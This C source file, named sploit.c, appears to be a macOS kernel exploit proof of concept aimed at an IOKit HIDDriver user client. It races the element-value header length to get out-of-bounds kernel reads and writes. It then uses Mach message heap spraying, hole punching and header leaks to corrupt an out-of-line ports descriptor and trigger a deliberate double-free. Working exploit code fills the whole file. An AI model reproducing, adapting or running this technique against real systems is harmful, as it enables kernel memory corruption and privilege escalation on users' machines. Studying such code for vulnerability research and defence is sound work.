//
//  sploit.c
//  HIDDriverLoader
//
//  Created by Tommy Muir on 11/08/2022.
//  Copyright Â© 2022 Apple. All rights reserved.
//

#include "sploit.h"
#include "../HIDDriver/HIDDriverUser.h"

#include <stdio.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <pthread.h>
#include <sys/mman.h>

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
#define ASSERT_KR(kr) if (kr != KERN_SUCCESS) {printf("[%d] kr: %s\n", __LINE__, mach_error_string(kr)); exit(0);}

#define KB (1024)
#define MB (1024 * KB)

typedef struct IOHIDElementValueHeader {
	uint32_t cookie;
	uint32_t length;
	uint32_t value[0];
} IOHIDElementValueHeader;

typedef struct {
	uint32_t idx;
	void* addr;
	size_t sz;
} hidbuffer_t;

io_connect_t client = IO_OBJECT_NULL;
static uint32_t _buffer_idx = 0;

void open_client(void) {
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceNameMatching("HIDDriver"));
	IOServiceOpen(service, mach_task_self(), 0, &client);
	IOObjectRelease(service);
	assert(client != IO_OBJECT_NULL);

	_buffer_idx = 0;
}

hidbuffer_t create_buffer(size_t sz) {
	assert(sz <= hidbuffer_request_payload_max);
	assert(_buffer_idx <= hidbuffer_request_payload_max);

	hidbuffer_t buf = {.idx = _buffer_idx};
	kern_return_t kr = IOConnectMapMemory(client, (uint32_t)sz | hidbuffer_request_type_size, mach_task_self(), (mach_vm_address_t*)&buf.addr, (mach_vm_size_t*)&buf.sz, kIOMapAnywhere);
	_buffer_idx++;
	ASSERT_KR(kr);
	assert(buf.sz == sz);

	mlock(buf.addr, buf.sz);
	memset(buf.addr, 0, buf.sz);

	return buf;
}

void release_buffer(hidbuffer_t* buf) {
	munlock(buf->addr, buf->sz);
	kern_return_t kr = IOConnectUnmapMemory(client, buf->idx | hidbuffer_request_type_index, mach_task_self(), (mach_vm_address_t)buf->addr);
	ASSERT_KR(kr);
}

struct oob_read_ctx {
	IOHIDElementValueHeader* header;
	size_t overflow_sz;
};
volatile int terminate_read = 0;
void* oob_read_thread(void* ctx) {
	IOHIDElementValueHeader* header = ((struct oob_read_ctx*)ctx)->header;
	size_t sz = ((struct oob_read_ctx*)ctx)->overflow_sz;

	for (int i = 0;; i++) {
		header->length = i % 2 ? (uint32_t)sz : 0;

		if (terminate_read)
			break;
	}

	return NULL;
}

#define COOKIE 4		//an output element with a large report size
#define COOKIE2 5		//any other valid cookie

//reads `sz` bytes of OOB data from the end of the kernel mapping for `buf`
//`sz` must be <= 0xfef
void oob_read(hidbuffer_t* buf, void* dst, size_t dst_sz) {
	/*
	set_values command structure:
	COOKIE2 = [any data]
	COOKIE2 = [any data]
	...
	COOKIE2 = [any data]
	COOKIE2 = [any data]

	COOKIE1 = [no data --> data past end of buffer]

	COOKIE2 = MAGIC

	if we win the race, the validation checks will pass when our target header is setting the value of COOKIE1 to no data, but will actually set the value of COOKIE1 to a large amount of data read outside of the buffer's bounds.

	we know we have won the race if we read back the header setting COOKIE2 to our magic value.
	*/

	struct magic_header_desc {
		IOHIDElementValueHeader hdr;
		uint64_t magic;
	};

	size_t sz = dst_sz + sizeof(struct magic_header_desc);
	uint64_t buf_idx = buf->idx;

	IOHIDElementValueHeader* first_hdr = (IOHIDElementValueHeader*)buf->addr;
	struct magic_header_desc* magic_hdr = (struct magic_header_desc*)((char*)buf->addr + buf->sz - sizeof(struct magic_header_desc));
	IOHIDElementValueHeader* target_hdr = (IOHIDElementValueHeader*)magic_hdr - 1;

	//first headers will do nothing, this is just to move the offset of the last header to the end of the buffer
	const size_t value_size = 0x1000;
	size_t remaining = buf->sz - sizeof(IOHIDElementValueHeader) - sizeof(struct magic_header_desc);
	for (IOHIDElementValueHeader* hdr = first_hdr; remaining > 0;) {
		hdr->cookie = COOKIE2;
		hdr->length = (uint32_t)MIN(value_size, remaining - sizeof(IOHIDElementValueHeader));

		size_t elem_sz = (hdr->length + sizeof(IOHIDElementValueHeader));
		remaining -= elem_sz;
		hdr = (IOHIDElementValueHeader*)((char*)hdr + elem_sz);
	}

	//this is the header we will OOB read out of
	target_hdr->cookie = COOKIE;
	target_hdr->length = 0;

	//at the end of the buffer we place a "magic" value so that we can know if we won the race
	magic_hdr->hdr.cookie = COOKIE2;
	magic_hdr->hdr.length = 8;
	magic_hdr->magic = 0xD1AB011CAC1DF00D;

	//start the thread to switch between different sizes of the target header:
	struct oob_read_ctx ctx = {
		.header = target_hdr,
		.overflow_sz = sz
	};
	pthread_t t;
	terminate_read = 0;
	pthread_create(&t, NULL, oob_read_thread, (void*)&ctx);

	//create the buffer that the element value will be written back to:
	hidbuffer_t read_buf = create_buffer(sizeof(IOHIDElementValueHeader) + sz);
	IOHIDElementValueHeader* read_header = (IOHIDElementValueHeader*)read_buf.addr;
	read_header->cookie = COOKIE;
	read_header->length = (uint32_t)sz;

	kern_return_t kr;
	for (;;) {
		kr = IOConnectCallScalarMethod(client, hiddriver_method_type_setvalues, &buf_idx, 1, NULL, NULL);
		if (kr == KERN_SUCCESS) {
			uint64_t get_vals_input[2] = {read_buf.idx, 1};
			kr = IOConnectCallScalarMethod(client, hiddriver_method_type_getvalues, get_vals_input, 2, NULL, NULL);
			ASSERT_KR(kr);

			//check to see if we won the race:
			struct magic_header_desc* test_magic = (struct magic_header_desc*)read_header->value;
			if (test_magic->magic == magic_hdr->magic) {
				//we read our magic value meaning we successfully read OOB data
				memcpy(dst, test_magic + 1, dst_sz);
				break;
			}
		}
	}

	terminate_read = 1;
	pthread_join(t, NULL);
	release_buffer(&read_buf);
}

struct write_magic_header_desc {
	IOHIDElementValueHeader hdr;
	uint32_t magic;
} __attribute__((packed));

size_t buffer_size_for_overflow(size_t kalloc_size, size_t overflow_size) {
	uint32_t cookie2_desc_count = (uint32_t)(kalloc_size / 4) - 1;
	uint32_t overflow_desc_count = (uint32_t)(overflow_size / 4);
	return sizeof(IOHIDElementValueHeader) * (cookie2_desc_count + overflow_desc_count) + sizeof(struct write_magic_header_desc);
}

struct oob_write_ctx {
	IOHIDElementValueHeader* header;
	size_t real_sz;
};
volatile int terminate_write = 0;
void* oob_write_thread(void* ctx) {
	IOHIDElementValueHeader* header = ((struct oob_write_ctx*)ctx)->header;
	size_t sz = ((struct oob_write_ctx*)ctx)->real_sz;

	for (int i = 0;; i++) {
		header->length = i % 2 ? 0 : (uint32_t)sz;

		if (terminate_write)
			break;
	}

	return NULL;
}

//one of the overflowed DWORDs must be an invalid cookie (should not be an issue)
void oob_write(hidbuffer_t* buf, size_t kalloc_size, void* overflow_data, size_t overflow_size, hidbuffer_t* helper_buf) {
	/*
	set_values command structure:
	COOKIE2 = [no data]
	COOKIE2 = [no data]
	...							(kalloc_size / 4) - 2 of these
	COOKIE2 = [no data]
	COOKIE2 = [no data]

	COOKIE2 = [data to rest of buffer --> no data]

	COOKIE1 = MAGIC

	overflow1 = [no data]
	overflow2 = [no data]
	...

	`cookies` will be allocated a size of kalloc_size - 4, alignment will mean this is the same as allocating kalloc_size

	we know we won the race if COOKIE1's value changed to the magic. This won't happen under normal circumstances as overflowX would trigger "Could not find element for cookie"
	*/

	//reset cookie1's value:
	const size_t cookie1_sz = helper_buf->sz - sizeof(IOHIDElementValueHeader);
	IOHIDElementValueHeader* helper_hdr = (IOHIDElementValueHeader*)helper_buf->addr;
	uint64_t helper_idx = helper_buf->idx;
	helper_hdr->cookie = COOKIE;
	helper_hdr->length = (uint32_t)cookie1_sz;
	memset(helper_hdr->value, 0, cookie1_sz);
	kern_return_t kr = IOConnectCallScalarMethod(client, hiddriver_method_type_setvalues, &helper_idx, 1, NULL, NULL);
	ASSERT_KR(kr);

	//prepare descriptors for overflow:
	size_t buf_sz = buffer_size_for_overflow(kalloc_size, overflow_size);
	assert(buf->sz == buf_sz);
	uint64_t buf_idx = buf->idx;

	uint32_t cookie2_desc_count = (uint32_t)(kalloc_size / 4) - 1;
	uint32_t overflow_desc_count = (uint32_t)(overflow_size / 4);

	IOHIDElementValueHeader* cookie2_hdrs = (IOHIDElementValueHeader*)buf->addr;
	for (uint32_t i = 0; i < cookie2_desc_count; i++) {
		cookie2_hdrs[i].cookie = COOKIE2;
		cookie2_hdrs[i].length = 0;
	}

	//this is the header we will be racing the length of:
	IOHIDElementValueHeader* target_hdr = &cookie2_hdrs[cookie2_desc_count - 1];

	struct write_magic_header_desc* magic_hdr = (struct write_magic_header_desc*)(target_hdr + 1);
	magic_hdr->hdr.cookie = COOKIE;
	magic_hdr->hdr.length = 4;
	magic_hdr->magic = 0xD15EA5ED;

	IOHIDElementValueHeader* overflow_hdrs = (IOHIDElementValueHeader*)(magic_hdr + 1);
	for (uint32_t i = 0; i < overflow_desc_count; i++) {
		overflow_hdrs[i].cookie = ((uint32_t*)overflow_data)[i];
		overflow_hdrs[i].length = 0;
	}

	//start the thread to switch between different sizes of the target header:
	size_t target_sz = overflow_desc_count * sizeof(IOHIDElementValueHeader) + sizeof(struct write_magic_header_desc);
	struct oob_write_ctx ctx = {
		.header = target_hdr,
		.real_sz = target_sz
	};

	pthread_t t;
	terminate_write = 0;
	pthread_create(&t, NULL, oob_write_thread, (void*)&ctx);

	for (;;) {
		kr = IOConnectCallScalarMethod(client, hiddriver_method_type_setvalues, &buf_idx, 1, NULL, NULL);
		if (kr == KERN_SUCCESS) {
			uint64_t get_vals_input[2] = {helper_buf->idx, 1};
			kr = IOConnectCallScalarMethod(client, hiddriver_method_type_getvalues, get_vals_input, 2, NULL, NULL);
			ASSERT_KR(kr);
			//check to see if we won the race:
			if (helper_hdr->value[0] == magic_hdr->magic) {
				//cookie1's value was changed, so we won the race
				break;
			}
		}
	}

	terminate_write = 1;
	pthread_join(t, NULL);
}

size_t msg_size_for_kalloc_size(size_t kalloc_size, uint32_t n_descs) {
	#define USER_DESC_MAX_DELTA 4
	#define USER_HEADER_SIZE_DELTA 8
	// kalloc_size = USER_DESC_MAX_DELTA * user_descs + msg_size + USER_HEADER_SIZE_DELTA + MAX_TRAILER_SIZE
	return kalloc_size - USER_DESC_MAX_DELTA * n_descs - MAX_TRAILER_SIZE - USER_HEADER_SIZE_DELTA;
}

static uint16_t rand_proc_secret = 0;

mach_port_t* spray_ool_ports_kmsg(size_t kalloc_data_size, size_t kalloc_size, unsigned int count) {
	struct ool_ports_msg {
		mach_msg_base_t base;
		mach_msg_ool_ports_descriptor_t ports;
	};
	size_t msg_sz = msg_size_for_kalloc_size(kalloc_data_size, 1);

	struct ool_ports_msg* msg = calloc(msg_sz, 1);

	mach_port_t* rcv_ports = calloc(sizeof(mach_port_t), count);
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	
	memset(msg, 0, msg_sz);
	msg->base.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	msg->base.header.msgh_size = (mach_msg_size_t)msg_sz;
	msg->base.body.msgh_descriptor_count = 1;

	for (unsigned int i = 0; i < count; ++i)
		mach_port_construct(mach_task_self(), &options, 0, &rcv_ports[i]);

	uint32_t ool_port_cnt = (uint32_t)(kalloc_size / 8);
	mach_port_t* ool_ports = calloc(sizeof(mach_port_t), ool_port_cnt);
	for (uint32_t i = 0; i < ool_port_cnt; i++)
		ool_ports[i] = MACH_PORT_NULL;

	msg->ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	msg->ports.address = ool_ports;
	msg->ports.count = ool_port_cnt;
	msg->ports.copy = MACH_MSG_PHYSICAL_COPY;
	msg->ports.disposition = MACH_MSG_TYPE_COPY_SEND;
	msg->ports.deallocate = 0;
	
	for (unsigned int i = 0; i < count; ++i)
	{
		msg->base.header.msgh_remote_port = rcv_ports[i];
		msg->base.header.msgh_id = (rand_proc_secret << 16) | i;
		kern_return_t kr = mach_msg_send(&msg->base.header);
		ASSERT_KR(kr);
	}

	free(msg);
	free(ool_ports);
	return rcv_ports;
}

typedef struct {
	mach_msg_bits_t               msgh_bits;
	mach_msg_size_t               msgh_size;
	void*                         msgh_remote_port;
	void*                         msgh_local_port;
	mach_port_name_t              msgh_voucher_port;
	mach_msg_id_t                 msgh_id;
} kernel_mach_msg_header_t;

bool get_kfree_ports(size_t kfree_sz, uint64_t* addr, mach_port_t* free_port0, mach_port_t* free_port1) {
	srand((uint32_t)time(NULL));
	rand_proc_secret = (uint16_t)rand();

	bool success = false;
	size_t buf_sz = 1 * MB;
	
	#define SPRAY_SIZE (500*MB)
	#define HOLES (99)
	#define SPRAY_COUNT (SPRAY_SIZE / buf_sz)

	//spray messages:
	mach_port_t* msg_spray = spray_ool_ports_kmsg(buf_sz, kfree_sz, SPRAY_COUNT);
	//poke holes in spray:
	for (int i = 1; i < HOLES + 1; i++) {
		int port_idx = i * (SPRAY_COUNT / (HOLES + 1));
		mach_port_destroy(mach_task_self(), msg_spray[port_idx]);
		msg_spray[port_idx] = MACH_PORT_NULL;
	}

	//allocate buffers (should fall in holes):
	//(allocate excess to hopefully catch panics instead of reading from unmapped pages)
	#define BUF_COUNT (HOLES * 2)
	hidbuffer_t bufs[BUF_COUNT];
	for (int i = 0; i < BUF_COUNT; i++)
		bufs[i] = create_buffer(buf_sz);
	
	//use OOB read to find a buffer in a hole:
	struct fake_kmsg_data {
		uint32_t pad0;
		kernel_mach_msg_header_t hdr;
		uint32_t pad1;
		mach_msg_ool_ports_descriptor_t ool_ports;
	} __attribute__((packed));

	size_t leak_sz = 0xfef;

	uint32_t leaked_hdrs_idx = 0;
	struct fake_kmsg_data* leaked_hdrs[2] = {0};
	hidbuffer_t* target_buf = NULL;
	for (int i = 0; i < HOLES && leaked_hdrs_idx < 2; i++) {
		struct fake_kmsg_data* hdr = (struct fake_kmsg_data*)calloc(leak_sz, 1);
		oob_read(&bufs[i], hdr, leak_sz);

		if (hdr->hdr.msgh_id >> 16 == rand_proc_secret) {
			leaked_hdrs[leaked_hdrs_idx++] = hdr;
			target_buf = &bufs[i];
		} else {
			free(hdr);
		}
	}

	uint64_t ool_ports_addr = 0;
	size_t overflow_sz = sizeof(*leaked_hdrs[1]);
	hidbuffer_t write_desc_buf;
	hidbuffer_t helper_buf;

	if (leaked_hdrs_idx != 2) {
		goto done;
	}

	//we have leaked the headers of 2 messages
	//target_buf falls directly before the header of the second one
	*free_port0 = msg_spray[leaked_hdrs[0]->hdr.msgh_id & 0xffff];
	*free_port1 = msg_spray[leaked_hdrs[1]->hdr.msgh_id & 0xffff];
	msg_spray[leaked_hdrs[0]->hdr.msgh_id & 0xffff] = MACH_PORT_NULL;
	msg_spray[leaked_hdrs[1]->hdr.msgh_id & 0xffff] = MACH_PORT_NULL;

	if (*free_port0 == *free_port1) {
		goto done;
	}

	success = true;
	ool_ports_addr = (uint64_t)leaked_hdrs[0]->ool_ports.address;
	*addr = ool_ports_addr;

	//make second message point to the ool ports from first message:
	leaked_hdrs[1]->ool_ports.address = (void*)ool_ports_addr;

	write_desc_buf = create_buffer(buffer_size_for_overflow(buf_sz, overflow_sz));	//this contains the maliciously crafted headers
	helper_buf = create_buffer(sizeof(IOHIDElementValueHeader) + 0xfff);			//this will be used to read element values back to, to determine if we won the race

	//free buffer, reallocate and overflow out of it, onto the kmsg
	release_buffer(target_buf);
	oob_write(&write_desc_buf, buf_sz, leaked_hdrs[1], overflow_sz, &helper_buf);

done:
	//cleanup:
	if (ool_ports_addr) {
		release_buffer(&write_desc_buf);
		release_buffer(&helper_buf);
	}
	for (int i = 0; i < BUF_COUNT; i++) {
		if (&bufs[i] != target_buf)
			release_buffer(&bufs[i]);
	}
	for (int i = 0; i < SPRAY_COUNT; i++) {
		if (msg_spray[i] != MACH_PORT_NULL)
			mach_port_destroy(mach_task_self(), msg_spray[i]);
	}
	free(msg_spray);
	free(leaked_hdrs[0]);
	free(leaked_hdrs[1]);

	return success;
}

void sploit(void) {
	open_client();

	size_t ool_ports_sz = 0x4000;

	mach_port_t free_port0, free_port1 = MACH_PORT_NULL;
	uint64_t addr_to_free = 0;

	printf("attempting to get double-free handles...\n");

	bool success = false;
	while (!(success = get_kfree_ports(ool_ports_sz, &addr_to_free, &free_port0, &free_port1)));

	if (success) {
		printf("got handle to free 0x%llx: [0x%x, 0x%x]\n", addr_to_free, free_port0, free_port1);
		printf("Freeing OOL messages...\n");

		//free ool ports:
		mach_port_destroy(mach_task_self(), free_port0);

		printf("Freeing OOL messages for a second time...\n");
		sleep(1);
		mach_port_destroy(mach_task_self(), free_port1);
	}

	IOServiceClose(client);
	client = IO_OBJECT_NULL;
}
